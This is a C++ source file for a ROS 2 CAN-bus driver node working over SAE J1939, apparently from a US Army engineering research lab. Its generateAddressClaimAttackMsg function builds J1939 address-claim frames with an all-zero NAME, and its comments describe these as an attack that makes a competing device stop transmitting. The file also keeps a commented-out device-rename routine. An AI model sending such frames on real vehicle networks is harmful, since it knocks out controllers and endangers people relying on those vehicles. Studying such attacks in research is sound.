/*
 * Copyright 2024 Construction Engineering Research Laboratory (CERL)
 * Engineer Reseach and Development Center (ERDC)
 * U.S. Army Corps of Engineers
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "generic_can_driver/generic_can_driver.hpp"

#include <memory>
#include <string>

using LNI = rclcpp_lifecycle::node_interfaces::LifecycleNodeInterface;
namespace rlc = rclcpp_lifecycle;

namespace ros2_j1939
{

GenericCanDriver::GenericCanDriver(const rclcpp::NodeOptions & OPTIONS)
: rclcpp_lifecycle::LifecycleNode("generic_driver_node", OPTIONS)
{}

GenericCanDriver::~GenericCanDriver() {}

// ADDRESS MANAGEMENT FUNCTIONS //

void GenericCanDriver::createDataArray(
  const std::vector<uint16_t> data_in, const std::vector<uint16_t> data_lengths, 
  std::array<uint8_t, 8UL> &data_out)
{
  uint64_t data_concatenated = 0;
  uint64_t data_mask = 0x00000000000000FF;
  int size = data_in.size();

  for (int i = 0; i < size; i++)
  {
    data_concatenated = data_concatenated << data_lengths[size - 1 - i];
    data_concatenated += data_in[size - 1 - i];
  }

  for (int i = 0; i < 8; i++)
  {
    data_out[i] = (data_mask & data_concatenated >> 8*i);
  }
}

void GenericCanDriver::generateAddressClaimAttackMsg(
  can_msgs::msg::Frame::SharedPtr MSG, const std::vector<uint32_t> source_addresses)
{
  // we go through each address given in the list
  for(uint32_t address : source_addresses)
  {
    // we add the source address (target of the claim attack) to a 'name declaration' message
    address += 0x18EEFF00;
    // by sending this message with only 0s, our name takes priority, 
    // and the competing device stops publishing   
    std::array<uint8_t, 8UL> claim_data = {
      0x00u, 0x00u, 0x00u, 0x00u, 0x00, 0x00, 0x00, 0x00u
      };

    // then we just stuff the can frame with all our data
    MSG->header.stamp = this->now();
    MSG->header.frame_id = "can";
    MSG->id = address;
    MSG->is_rtr = false;
    MSG->is_extended = true;
    MSG->is_error = false;
    MSG->dlc = 8;
    MSG->data = claim_data;
  }
}


// void GenericCanDriver::setupDatabase(NewEagle::Dbc dbw_dbc_db, const std::string dbw_dbc_file)
// {
//   dbw_dbc_db = NewEagle::DbcBuilder().NewDbc(dbw_dbc_file);

// }

// void GenericCanDriver::setupMap()
// {
//   dbc_name_msg_map_ = * dbw_dbc_db_.GetMessages();

//   for (auto [key, value] : dbc_name_msg_map_)
//   {
//     // strip id of priority and source address info
//     uint32_t stripped_id = value.GetId() & 0x00FFFF00u;
//     dbc_id_msg_map_[stripped_id] = value;
//   }
// }

// TODO:Arturo - Look through this and make sure it's the standard way of renaming CAN devices
// also, this could just be its own .log file or something idk

// void GenericCanDriver::txRename(
//   const std::array<uint8_t, 8UL> name, const uint8_t new_source_address)
// {
//   std::array<uint8_t, 8UL> BAM_data_out = {0x20u, 0x09u, 0x00u, 0x02u, 0xFFu, 0xD8u, 0xFEu, 0x00u};
//   can_msgs::msg::Frame BAM_frame_out;
//   uint32_t j1939_id = 0x1CECFF00u;
//   BAM_frame_out.header.stamp = this->now();
//   BAM_frame_out.header.frame_id = "ROS2_command";
//   BAM_frame_out.id = j1939_id;
//   BAM_frame_out.is_rtr = false;
//   BAM_frame_out.is_extended = true;
//   BAM_frame_out.is_error = false;
//   BAM_frame_out.dlc = 8;
//   BAM_frame_out.data = BAM_data_out;

//   std::array<uint8_t, 8UL> name_data_out_1 = {0x01u, name[0], name[1], name[2],
//     name[3], name[4], name[5], name[6]};
//   can_msgs::msg::Frame name_frame_out_1;
//   j1939_id = 0x1CEBFF00u;
//   name_frame_out_1.header.stamp = this->now();
//   name_frame_out_1.header.frame_id = "ROS2_command";
//   name_frame_out_1.id = j1939_id;
//   name_frame_out_1.is_rtr = false;
//   name_frame_out_1.is_extended = true;
//   name_frame_out_1.is_error = false;
//   name_frame_out_1.dlc = 8;
//   name_frame_out_1.data = name_data_out_1;

//   std::array<uint8_t, 8UL> name_data_out_2 = {0x02u, name[7], new_source_address, 0xFF, 0xFF, 0xFF,
//     0xFF, 0xFF};
//   can_msgs::msg::Frame name_frame_out_2;
//   j1939_id = 0x1CEBFF00u;
//   name_frame_out_2.header.stamp = this->now();
//   name_frame_out_2.header.frame_id = "ROS2_command";
//   name_frame_out_2.id = j1939_id;
//   name_frame_out_2.is_rtr = false;
//   name_frame_out_2.is_extended = true;
//   name_frame_out_2.is_error = false;
//   name_frame_out_2.dlc = 8;
//   name_frame_out_2.data = name_data_out_2;

//   pub_can_->publish(BAM_frame_out);
//   rclcpp::sleep_for(std::chrono::milliseconds(100));
//   pub_can_->publish(name_frame_out_1);
//   rclcpp::sleep_for(std::chrono::milliseconds(100));
//   pub_can_->publish(name_frame_out_2);
//   RCLCPP_INFO(this->get_logger(), "Published renaming thing!!!!!!!! %d", new_source_address);
// }


}  // namespace generic_can_driver

#include "rclcpp_components/register_node_macro.hpp"
RCLCPP_COMPONENTS_REGISTER_NODE(ros2_j1939::GenericCanDriver)
